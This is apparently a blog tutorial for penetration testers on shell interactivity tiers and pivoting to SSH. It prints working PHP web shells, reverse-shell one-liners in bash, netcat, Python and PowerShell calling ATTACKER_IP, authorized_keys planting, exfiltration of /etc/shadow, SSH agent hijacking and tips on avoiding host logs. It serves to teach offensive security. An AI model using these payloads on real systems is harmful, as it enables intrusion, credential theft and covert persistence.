---
title: Shells, TTY, and SSH - A Practical Guide for Offensive Security
date: 2026-03-14
lastmod: 2026-03-14
description: A technical guide covering shell interactivity tiers in offensive security - web shell, dumb shell, pseudo TTY, and upgraded TTY - including payloads, upgrade techniques, and a practical comparison of in-place TTY upgrade versus pivoting to SSH.
summary: This post breaks down every tier of shell quality, how to upgrade, and when it makes sense to just SSH in instead (along with the real trade-offs of doing so).
tags:
categories:
  - technical-blog
draft: false
---
## Overview

When you first land a shell on a target, you rarely have what you need out-of-the-box. You may have a `php` web shell that is stateless without any interactive capability. Or you may have a raw `netcat` shell that breaks on `Ctrl + C`, can't run `vim, nano, sudo`, and has no tab completion. They may not be sufficient enough for you to continue your work. Therefore, understanding the spectrum of shell quality - from a simple web shell to a fully upgraded TTY - is an essential knowledge for anyone doing penetration testing or red teaming. 

This post walks through every tier of shell interactivity, the payloads and upgrade techniques for each, and then tackles a question that often gets oversimplified: 

> _When and why would you pivot to SSH instead of upgrading your shell in-place, and what are the real trade-offs?_

---

## 1. Shell Types - The Interactivity Spectrum

Not all shells are created equal. The core dimension that separates them is **interactivity**, which means how much the shell behaves like a real terminal session. There are 4 tiers:

### Tier 4 - Web Shell

A web shell is a script (`PHP, ASPX, JSP, etc.`) uploaded or injected into a web server, providing command execution through HTTP requests. It is not a shell in the traditional sense - there is no persistent connection, no TTY, and each command is a separate HTTP transaction.

### Tier 3 - Dumb Shell

A dumb shell is a raw reverse or bind shell established over a TCP connection (`classic netcat`, `/dev/tcp`, etc.). It has no TTY attached, which means:

- `Ctrl+C` kills the entire connection instead of the running process
- No job control (`bg`, `fg`)
- No tab completion
- Text editors like `vim` are broken or unusable
- Commands that depend on terminal dimensions fail

### Tier 2 - Pseudo TTY (PTY)

By spawning a pseudo-terminal inside the existing shell, we get signal handling and basic interactivity back. `Ctrl+C` now sends `SIGINT` to the foreground process instead of killing the connection. Basic text editors start working. However, tab completion and arrow keys still don't function properly because the local terminal is not yet in **raw mode**.

### Tier 1 - Upgraded TTY

A fully upgraded TTY puts the local terminal into raw mode (`stty raw -echo`), which passes all keystrokes - including `Ctrl+C`, arrow keys, and `Tab` - directly through to the remote PTY. This is functionally equivalent to a native terminal session. Everything works: `vim`, `sudo`, tab completion, command history, and interactive programs like `top`.

### Comparison at a Glance

| Feature         | Web shell | Dumb shell | Pseudo TTY | Upgraded TTY |
| --------------- | --------- | ---------- | ---------- | ------------ |
| TTY             | ✗         | ✗          | partial    | ✓            |
| Ctrl+C safe     | ✗         | ✗          | ✓          | ✓            |
| Tab completion  | ✗         | ✗          | ✗          | ✓            |
| Text editors    | ✗         | ✗          | partial    | ✓            |
| Signal handling | ✗         | ✗          | ✓          | ✓            |
| Encryption      | ✗         | ✗          | ✗          | ✗            |
| Stability       | low       | low        | medium     | medium       |
| Persistence     | ✓ (file)  | ✗          | ✗          | ✗            |

---

## 2. Deep Dive - Per Shell Type

### Web Shell

**What it is:** A server-side script that executes system commands and returns output over HTTP. The attacker interacts with it through a browser or tool like `curl`.

**Use case:** Initial access after exploiting a file upload vulnerability, RFI/LFI, or CMS vulnerability. Also useful as a persistent foothold since it survives connection drops - as long as the file stays on disk.

**Limitations:** Non-interactive, no TTY, command output is bounded by HTTP response. Blind to long-running processes. Easily detected by file integrity monitoring and WAFs. Each request is a separate transaction - no environment state between commands.

**Common payloads:**

```php
<!-- PHP - minimal -->
<?php system($_GET['cmd']); ?>

<!-- PHP - with output buffering -->
<?php echo shell_exec($_REQUEST['cmd']); ?>

<!-- PHP - reverse shell -->
<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc ATTACKER_IP ATTACKER_PORT >/tmp/f"); ?>
```

**Upgrade path:** Use the web shell to execute a reverse shell one-liner, transitioning to a *dumb shell*.

---

### Dumb Shell

**What it is:** A raw TCP shell with no TTY. Typically established via `netcat`, `/dev/tcp`, or a scripting language's socket library.

**Use case:** First interactive foothold after initial access. Fast to deploy, minimal dependencies.

**Limitations:** *Fragile* - `Ctrl+C` kills the session. No tab completion, no text editors, no job control. Traffic is plaintext over raw TCP (easily flagged by network monitoring).

**Common payloads:**

```bash
# Bash - /dev/tcp
bash -i >& /dev/tcp/ATTACKER_IP/ATTACKER_PORT 0>&1

# Netcat with -e (if supported)
nc -e /bin/bash ATTACKER_IP ATTACKER_PORT

# Netcat without -e (mkfifo)
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc ATTACKER_IP ATTACKER_PORT >/tmp/f

# Python 3
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",ATTACKER_PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
```

```powershell
# PowerShell reverse shell
$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',ATTACKER_PORT)
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{0}
while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){
    $data = (New-Object System.Text.ASCIIEncoding).GetString($bytes,0,$i)
    $sendback = (iex $data 2>&1 | Out-String)
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback + 'PS ' + (pwd).Path + '> ')
    $stream.Write($sendbyte,0,$sendbyte.Length)
    $stream.Flush()
}
$client.Close()
```

**Upgrade path:** Spawn a Pseudo TTY (PTY) to reach Tier 2.

---

### Pseudo TTY

**What it is:** A PTY spawned inside an existing dumb shell using Python's `pty` module, `script`, or `socat`. Provides signal handling and basic interactivity without requiring local terminal changes.

**Use case:** Intermediate upgrade step. Necessary before attempting the full TTY upgrade. Also useful when you need `sudo` prompts or signal-safe commands but can't perform the full upgrade sequence.

**Limitations:** Arrow keys and tab completion still don't work because the local terminal is still in `cooked` mode - it processes keystrokes before passing them to the remote PTY. Text editors are partially functional but *unreliable*.

**Payloads to spawn a PTY:**

```bash
# Python 3 (most common)
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Python 2
python -c 'import pty; pty.spawn("/bin/bash")'

# script utility (if Python unavailable)
script -qc /bin/bash /dev/null

# socat (best option if available - jumps straight to Tier 1)

## On attacker:
socat file:`tty`,raw,echo=0 tcp-listen:ATTACKER_PORT

## On target:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:ATTACKER_IP:ATTACKER_PORT
```

**Upgrade path:** Proceed to the full TTY upgrade sequence.

---

### Upgraded TTY

**What it is:** A fully interactive terminal session achieved by combining a *PTY* on the target with *raw mode* on the attacker's local terminal.

**Use case:** Any situation requiring real interactivity: running `vim`, `sudo`, `top`, or any program that depends on terminal dimensions and key events. The standard target state for stable post-exploitation work.

**Limitations:** Still a single TCP channel (no built-in encryption, no file transfer, no port forwarding). If the connection drops, the session is gone.

**Full upgrade sequence:**

```bash
# Step 1 - On target: spawn a PTY (to get Tier 2)
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Step 2 - Background the shell with Ctrl+Z
## Then on attacker local terminal:
stty raw -echo; fg
## Press Enter to go back on target shell:
reset

# Step 3 - On target: fix terminal environment
export TERM=xterm-256color
export SHELL=/bin/bash

# Step 4 - Match terminal dimensions
# Check your local terminal first: stty size
stty rows 50 cols 220   # adjust to your terminal dimensions
```

---

## 3. SSH as an Alternative

### a. The Technique

Once you have a *web shell* or *dumb shell* with write access to a user's home directory, you can plant your public key and establish a full SSH session - skipping the entire TTY upgrade process entirely.

```bash
# From your dumb shell on target:
mkdir -p ~/.ssh && chmod 700 ~/.ssh
echo "ssh-rsa AAAA...YOUR_PUBLIC_KEY..." >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys

# From attacker machine:
ssh -i ~/.ssh/id_rsa user@TARGET_IP
```

**Prerequisites:**

- `sshd` is running (`ss -tlnp | grep 22`)
- Port 22 is reachable from your machine
- `PubkeyAuthentication yes` in `/etc/ssh/sshd_config` (default on most distributions)
- Write access to the target user's `~/.ssh/` directory

### b. Why SSH is More Capable Than an Upgraded TTY Shell

SSH is not just "**a better shell**" - it is a fully featured secure channel protocol. The comparison is not really fair to the upgraded TTY shell:

- **Native full TTY.** No upgrade sequence needed. The moment you connect, you have a proper terminal.

- **Encryption.** All traffic is encrypted with `AES`. A raw reverse shell over TCP is plaintext - trivially intercepted and flagged by network monitoring. SSH traffic is indistinguishable from legitimate administrative access at the packet level.

- **File transfer.** `scp` and `sftp` are available without any additional setup.

```bash
# Upload a tool to target
scp ./linpeas.sh user@TARGET:/tmp/

# Download loot
scp user@TARGET:/etc/shadow ./
```

- **Port forwarding.** This is where SSH genuinely outclasses everything else for post-exploitation.

```bash
# Local forward: access an internal service through target
ssh -L 8080:192.168.1.100:80 user@TARGET
# → localhost:8080 now tunnels to 192.168.1.100:80 via target

# Dynamic SOCKS proxy: route all traffic through target into the internal network
ssh -D 1080 user@TARGET
proxychains nmap -sT 192.168.1.0/24
```

- **Stability and reconnection.** If the connection drops, you simply reconnect with the same command. No need to re-exploit, re-upgrade, or re-establish a reverse shell.

- **Session multiplexing.** SSH supports multiple logical channels over a single connection (`ControlMaster`), useful for running parallel operations.

### c. The Trade-off - Noisy at the Host Level

SSH's robustness comes at a cost: it is significantly noisier than a raw shell at the **host forensics** level.

A dumb reverse shell on port 4444 creates no authentication events, no session records, and no login logs. SSH, by design, creates all of these:

```
/var/log/auth.log       - login event, source IP, public key fingerprint
/var/log/secure         - equivalent on RHEL/CentOS
~/.bash_history         - every command executed during the session
/var/log/wtmp           - persistent session history (readable via `last`)
/var/run/utmp           - currently logged-in users (readable via `who`)
```

The `authorized_keys` modification itself is also a detectable event. EDR solutions and `auditd` commonly watch for writes to SSH key files:

```
# Common auditd rule:
-w /root/.ssh/authorized_keys -p wa -k ssh_key_modification
```

**Important distinction:** SSH is noisy with respect to _host-based logging and forensics_, not necessarily with respect to _network-level detection_. On the network, SSH traffic over port 22 or 443 looks entirely legitimate - encrypted, standard protocol, indistinguishable from admin activity. A raw TCP reverse shell is far more suspicious at the network level. These are two different threat models, and which one matters more depends entirely on the environment.

### d. Avoid the Trade-off (You Don't Always Need to Write a Key)

The assumption that "SSH persistence requires touching `authorized_keys`" is incorrect. Several approaches avoid that write entirely:

**Password authentication:** If `PasswordAuthentication yes` is enabled and you have credentials from a credential dump or password spray, SSH in directly. No files touched.

**SSH as transport, not persistence:** The most common real-world use: don't use SSH for persistence at all. Use your C2 implant for persistence, and pull up an SSH session only when you need interactive access or heavy file operations. The key gets written once for the duration of the operation, then removed.

**SSH agent hijacking:** If a legitimate user is logged in and has an active SSH agent socket, you can hijack it:

```bash
# Find active agent sockets
find /tmp -name "agent.*" 2>/dev/null

# Use their agent to authenticate as them
export SSH_AUTH_SOCK=/tmp/ssh-XXX/agent.1234
ssh user@internal-host
```

No keys written. No `authorized_keys` modification. You are reusing an existing authenticated session.

**Modifying `sshd_config` instead:** If you have root and need a lower-footprint change, enabling `PasswordAuthentication yes` or adjusting `AuthorizedKeysFile` to a non-standard path is often watched less carefully than `authorized_keys` itself.

### e. When to Use SSH vs. When Not To

| **Situation**                       | **Recommendation**                          |
| ----------------------------------- | ------------------------------------------- |
| Need stability for a long operation | SSH (plant key, reconnect at will)          |
| Need file transfer                  | SSH (`scp`/`sftp`)                          |
| Pivoting into internal network      | SSH dynamic forwarding (`-D`) + proxychains |
| EDR-mature environment              | Avoid SSH persistence; use C2 implant       |
| CTF / lab environment               | SSH is almost always the right move         |
| Need to stay quiet at host level    | Stick with upgraded TTY shell or C2         |
| Already have credentials            | SSH directly - no key write needed          |

The underlying principle: **SSH is a tool, not a strategy**. In environments with mature host-based detection, planting an SSH key is an **amateur** persistence move. In a CTF or a lightly monitored environment, it is the fastest path to a stable, full-featured session.

---

## 4. Putting It Together 

The terminal goal in most engagements is not an upgraded TTY - it is a C2 implant with encrypted, resilient communications. Shells, TTY upgrades, and SSH sessions are all intermediate steps: ways to establish stability and maneuver until you can deploy something purpose-built.

**As a rule of thumb**

> Use what gets you stable fastest, upgrade only as far as the task requires, and always know what logs you are leaving behind.